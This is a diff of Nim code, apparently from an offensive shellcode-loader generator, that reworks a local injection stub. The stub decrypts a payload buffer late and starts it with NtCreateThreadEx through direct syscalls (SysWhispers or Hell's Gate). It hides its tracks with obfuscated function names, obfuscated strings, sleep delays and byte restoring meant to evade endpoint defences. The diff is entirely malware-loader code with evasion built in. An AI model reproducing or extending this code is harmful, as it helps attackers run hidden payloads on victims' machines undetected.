@@ -222,28 +222,22 @@ let LocalInjectStub*  = """
                     ptrDecText = cast[ptr byte](buffer)
                     decryptLate()
 
-                when defined(SysWhispers):
-                    when not defined(RX):
-                        when defined(sleepinbetween):
-                            HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
-                        ptrEncText = cast[ptr byte](buffer)
-                        ptrDecText = cast[ptr byte](buffer)
-                        decryptLate()
-                    status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,buffer,NULL, FALSE, 0, 0, 0, NULL)
-                    NtWaitForSingleObject(tHandle, 0, nil)
-                    when defined(JmpEntry):
-                        Sleep(1000)
-                        if(restoreBytes(-1, buffer)):
-                            when defined(verbose):
-                                echo obf("[*] Restored bytes!")
-                        else:
-                            when defined(verbose):
-                                echo obf("[-] Failed to restore bytes!")
-                    Wait()
-                    status = zuatzuastdiasyy(tHandle)
-                    status = zuatzuastdiasyy(pHandle)
-                    when defined(verbose):
-                        echo obf("[*] NtCreateThreadEx: "), toHex(status)
+            when defined(SysWhispers):
+                status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,buffer,NULL, FALSE, 0, 0, 0, NULL)
+                NtWaitForSingleObject(tHandle, 0, nil)
+                when defined(JmpEntry):
+                    Sleep(1000)
+                    if(restoreBytes(-1, buffer)):
+                        when defined(verbose):
+                            echo obf("[*] Restored bytes!")
+                    else:
+                        when defined(verbose):
+                            echo obf("[-] Failed to restore bytes!")
+                Wait()
+                status = zuatzuastdiasyy(tHandle)
+                status = zuatzuastdiasyy(pHandle)
+                when defined(verbose):
+                    echo obf("[*] NtCreateThreadEx: "), toHex(status)
             else:    
                 when defined(Hellsgate):
                     if getSyscall(ntCreateTable):
@@ -251,12 +245,6 @@ let LocalInjectStub*  = """
                     else:
                         when defined(verbose):
                             echo obf("[-] Failed to find opcode for NtCreateThreadEx")
-                when not defined(RX):
-                    when defined(sleepinbetween):
-                        HowMuchTimeWouldYouLikeToSleep(sleepbetweentime)
-                    ptrEncText = cast[ptr byte](buffer)
-                    ptrDecText = cast[ptr byte](buffer)
-                    decryptLate()
                 status = NtCreateThreadEx(
                 &tHandle, 
                 THREAD_ALL_ACCESS, 
